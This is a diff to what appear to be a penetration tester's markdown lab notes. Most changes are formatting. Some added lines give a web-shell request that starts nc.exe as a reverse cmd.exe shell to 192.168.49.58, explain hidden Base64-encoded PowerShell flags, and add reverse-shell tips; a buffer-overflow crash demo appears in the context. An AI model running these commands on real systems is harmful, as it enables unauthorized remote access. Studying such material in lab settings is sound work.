@@ -22,7 +22,15 @@
 * [Compiling Vulnerable C Code](#compiling-vulnerable-c-code)
 
 ### General Tips
-* Avoid calling PowerShell from a Netcat provided cmd.exe shell. 
+* Avoid calling PowerShell from a Netcat-provided cmd.exe shell. 
+* To upgrade your shell to a fully-functional PTY on Windows, try using nc.exe instead of a Msfvenom reverse shell.
+* If you get the error below via a web shell, change the LPORT variable of your exploit. 
+```
+/*
+Warning: fread() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 74
+
+Warning: fclose() expects parameter 1 to be resource, bool given in C:\xampp\htdocs\rshell.php on line 89
+```
 
 ### Windows Command Shell
 #### Search the Entire Filesystem for a File 
@@ -33,24 +41,28 @@ dir "\network-secret.txt" /s
 #### Get the Kernel Version
 ```pwsh
 systeminfo | findstr Build
-
+```
+```pwsh
 # output
 OS Version:                10.0.17763 N/A Build 17763
 ```
 
 ### PowerShell
 #### One-Liner Syntax
+* -nop = No Profile (do not load the user's PowerShell profile)
+* -w hidden = WindowsStyle is Hidden (do not open a window during execution)
+* -e = Encoded Command (execute the following Base64 string as a command)
 ```bash
 powershell.exe -nop -w hidden -e abcdcef...
+```
 
-# -nop = No Profile (do not load the user's PowerShell profile)
-# -w hidden = WindowsStyle is Hidden (do not open a window during exec)
-# -e = Encoded Command (execute the following Base64 string as a command)
+#### Using a Web Shell
+```bash
+cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cmd.exe'"
 ```
 
 ### Bourne-Again Shell (BASH)
 #### Create a Command Alias
-**Interactive Shells** (the CLI, a.k.a terminal)  
 Zsh
 ```bash
 echo "alias cls='cls'" >> .zshrc # just me
@@ -70,7 +82,7 @@ echo "alias cls='cls'" >> /etc/profile # for all users
 ```
 
 #### Environment Variables
-##### PS1
+PS1
 ```bash
 # how to change it to the previously less flashy one
 vim .bashrc
@@ -80,8 +92,8 @@ vim .bashrc
 ```
 
 #### Shell
-```nash
-# how to change it from Zsh to BASH
+How to change it from ZSH to BASH.
+```bash
 chsh -s /bin/bash
 sudo reboot now
 ```
@@ -110,9 +122,17 @@ wget -r http://$TARGET/$FOLDER -O $FOLDER
 #### Web Server One-Liners
 ```bash
 python -m SimpleHttpServer 5050
+```
+```bash
 python3 -m http.server 5050
+```
+```bash
 php -S 0.0.0.0:5050
+```
+```bash
 ruby -run -e httpd . -p 5050
+```
+```bash
 busybox httpd -f -p 5050
 ```
 
@@ -210,7 +230,8 @@ gcc bof.c -o bof
 #### How to Run the Resulting, Compiled Program (Example 1)
 ```bash
 ./bof hello
-
+```
+```bash
 # output
 hello
 ```
@@ -218,7 +239,8 @@ hello
 #### How to Run the Resulting, Compiled Program (Example 2)
 ```bash
 ./bof $(printf 'A%.0s' {1..64})
-
+```
+```bash
 # output
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
@@ -226,7 +248,8 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 #### How to Crash the Resulting, Compiled Program
 ```bash
 ./bof $(printf 'A%.0s' {1..72})
-
+```
+```bash
 # output
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault
